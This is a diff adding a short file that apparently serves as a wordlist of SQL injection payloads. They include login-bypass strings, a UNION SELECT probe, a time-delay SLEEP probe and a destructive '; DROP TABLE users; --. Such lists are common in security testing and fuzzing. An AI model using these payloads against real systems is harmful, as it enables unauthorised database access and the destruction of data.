@@ -1,0 +1,19 @@
+' OR '1'='1
+
+' OR 1=1--
+
+' OR 'a'='a
+
+admin' --
+
+' UNION SELECT NULL, NULL, NULL--
+
+' OR EXISTS(SELECT * FROM users) --
+
+' AND 1=(SELECT COUNT(*) FROM tablename) --
+
+' OR SLEEP(5) --
+
+' OR 'x'='x' AND 'x'='y
+
+'; DROP TABLE users; --
